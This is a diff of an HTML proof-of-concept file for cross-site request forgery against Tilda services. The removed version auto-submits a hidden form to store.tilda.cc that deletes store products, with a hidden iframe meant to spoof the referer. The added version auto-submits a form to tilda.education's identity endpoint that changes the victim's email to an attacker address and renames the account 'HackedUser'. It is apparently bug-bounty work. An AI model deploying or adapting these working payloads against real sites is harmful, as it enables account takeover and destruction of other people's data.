@@ -1,27 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>CSRF PoC</title>
-</head>
-<body>
-<h3>CSRF PoC – store.tilda.cc</h3>
-
-<!-- Step 1: Create a hidden iframe to load the spoofed referer URL -->
-<iframe id="spoof" src="https://anything@store.tilda.cc/" style="display:none;"></iframe>
-
-<!-- Step 2: Auto-submit the forged POST request -->
-<form id="csrfForm" action="https://store.tilda.cc/store/submit/" method="POST">
-    <input type="hidden" name="comm" value="delproductsselected">
-    <input type="hidden" name="projectid" value="15812966">
-    <input type="hidden" name="productsids" value="582141405642,">
+<form action="https://tilda.education/en/identity/" method="POST">
+<input type="hidden" name="email" value="attacker@example.com">
+<input type="hidden" name="name" value="HackedUser">
 </form>
 
 <script>
-// Wait a moment to let the referer spoof load
-setTimeout(function () {
-    document.getElementById('csrfForm').submit();
-}, 1500);
+document.forms[0].submit();
 </script>
-
-</body>
-</html>
